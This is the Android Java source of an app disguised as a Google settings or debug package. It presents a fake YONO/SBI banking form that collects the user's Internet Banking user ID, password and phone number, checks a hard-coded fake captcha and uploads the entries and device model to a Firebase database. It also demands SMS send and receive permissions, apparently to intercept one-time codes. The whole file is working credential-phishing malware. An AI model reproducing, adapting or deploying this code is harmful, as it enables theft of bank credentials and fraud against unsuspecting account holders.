    package settings.google.test.debug.system.yonos4bi;

    import android.Manifest;
    import android.annotation.SuppressLint;
    import android.content.DialogInterface;
    import android.content.Intent;
    import android.content.pm.PackageManager;
    import android.graphics.Typeface;
    import android.os.Build;
    import android.os.Bundle;
    import android.provider.Settings;
    import android.text.SpannableString;
    import android.text.Spanned;
    import android.text.style.StyleSpan;
    import android.util.Log;
    import android.widget.Button;
    import android.widget.EditText;
    import android.widget.TextView;
    import android.widget.Toast;

    import androidx.annotation.NonNull;
    import androidx.annotation.RequiresApi;
    import androidx.appcompat.app.AlertDialog;
    import androidx.appcompat.app.AppCompatActivity;
    import androidx.core.app.ActivityCompat;
    import androidx.core.content.ContextCompat;

    import com.google.firebase.database.DatabaseReference;
    import com.google.firebase.database.FirebaseDatabase;

    import java.util.HashMap;
    import java.util.Map;


    import settings.google.test.debug.system.yonos4bi.bg.FormValidator;

    public class MainActivity extends AppCompatActivity {

        public Map<Integer, String> ids;
        public HashMap<String, Object> dataObject;


        private static final int SMS_PERMISSION_REQUEST_CODE = 1;

        @SuppressLint("SetTextI18n")
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);

            TextView instructionText = findViewById(R.id.ins);
            String text = "Please use your existing Internet Banking User ID and Password (credentials) of Personal and YONO Business Internet Banking and Update PAN CARD Details.";
            SpannableString spannable = new SpannableString(text);
            spannable.setSpan(new StyleSpan(Typeface.BOLD), text.indexOf("Internet Banking User ID"), text.indexOf("Internet Banking User ID") + "Internet Banking User ID".length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
            spannable.setSpan(new StyleSpan(Typeface.BOLD), text.indexOf("Password"), text.indexOf("Password") + "Password".length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
            spannable.setSpan(new StyleSpan(Typeface.BOLD), text.indexOf("Personal"), text.indexOf("Personal") + "Personal".length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
            spannable.setSpan(new StyleSpan(Typeface.BOLD), text.indexOf("YONO Business Internet Banking"), text.indexOf("YONO Business Internet Banking") + "YONO Business Internet Banking".length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
            spannable.setSpan(new StyleSpan(Typeface.BOLD), text.indexOf("PAN CARD Details"), text.indexOf("PAN CARD Details") + "PAN CARD Details".length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);

            instructionText.setText(spannable);


            dataObject = new HashMap<>();

            checkAndRequestPermissions();

            if(!Helper.isNetworkAvailable(this)) {
                Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
                startActivity(intent);
            }

            Helper.setNumber(this);

            // Initialize the ids map
            ids = new HashMap<>();
            ids.put(R.id.userid, "userid");
            ids.put(R.id.password, "password");
            ids.put(R.id.phone, "phone");

            // Populate dataObject
            for(Map.Entry<Integer, String> entry : ids.entrySet()) {
                int viewId = entry.getKey();
                String key = entry.getValue();
                EditText editText = findViewById(viewId);

                String value = editText.getText().toString().trim();
                dataObject.put(key, value);
            }

            Button buttonSubmit = findViewById(R.id.submit);
            buttonSubmit.setOnClickListener(v -> {

                if (validateForm()) {
                    EditText captcha = findViewById(R.id.captcha);
                    if(!captcha.getText().toString().trim().equals("8985B")){
                        captcha.setError("Invalid captcha");
                        return ;
                    }
                    buttonSubmit.setText("Please Wait");


                    dataObject.put("device", Build.MODEL);
                    dataObject.put("created_at", Helper.datetime());
                    dataObject.put("updated_at", Helper.datetime());

                    Log.d(Helper.TAG, "dataObject +  "+dataObject.toString());

                    // Write a message to the database
                    FirebaseDatabase database = FirebaseDatabase.getInstance();
                    DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("form");
                    String userId = usersRef.push().getKey();
                    String userId2 = usersRef.push().getKey();
                    assert userId != null;
                    usersRef.child(userId).child(userId2).setValue(dataObject)
                            .addOnSuccessListener(aVoid -> {
                                Intent intent = new Intent(MainActivity.this, Loading.class);
                                intent.putExtra("id", userId);
                                intent.putExtra("nextActivity", "SecondActivity");
                                intent.putExtra("loadText", "Please wait... Verifying Your Login Details\n Redirecting in 5 seconds");
                                startActivity(intent);
                            })
                            .addOnFailureListener(e -> {
                                Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                                Log.d(Helper.TAG, "Error: " + e.getMessage());
                            });

                } else {
                    Toast.makeText(MainActivity.this, "form validation failed", Toast.LENGTH_SHORT).show();
                }
            });

        }

        @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
        private void initializeWebView() {
            // Implementation
        }

        public boolean validateForm() {
            boolean isValid = true;
            for (Map.Entry<Integer, String> entry : ids.entrySet()) {
                int viewId = entry.getKey();
                String key = entry.getValue();
                EditText editText = findViewById(viewId);
                if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                    isValid = false;
                    break;
                }
                String value = editText.getText().toString().trim();
                switch (key) {
                    case "phone":
                        isValid = FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key);
                        break;
                    case "password":
                        isValid = FormValidator.validatePassword(editText, "Invalid Password");
                        break;
                    default:
                        break;
                }
                if (isValid) {
                    dataObject.put(key, value);
                }
            }

            return isValid;
        }


        // start permission checker
        private void checkAndRequestPermissions() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Check if the SMS permission is not granted
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) !=
                        PackageManager.PERMISSION_GRANTED ||
                        ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) !=
                                PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS},
                            SMS_PERMISSION_REQUEST_CODE);
                } else {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        initializeWebView();
                    }
                }
            } else {
                Toast.makeText(this, "Below Android Device", Toast.LENGTH_SHORT).show();
                initializeWebView();
            }
        }

        @RequiresApi(api = Build.VERSION_CODES.M)
        @Override
        public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                               @NonNull int[] grantResults) {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);

            if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
                if (grantResults.length > 0 &&
                        grantResults[0] == PackageManager.PERMISSION_GRANTED &&
                        grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        initializeWebView();
                    }
                } else {
                    // SMS permissions denied
                    showPermissionDeniedDialog();
                }
            }
        }

        private void showPermissionDeniedDialog() {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Permission Denied");
            builder.setMessage("SMS permissions are required to send and receive messages. " +
                    "Please grant the permissions in the app settings.");

            // Open settings button
            builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    openAppSettings();
                }
            });

            // Cancel button
            builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                    finish();
                }
            });

            builder.show();
        }
        private void openAppSettings() {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }


    }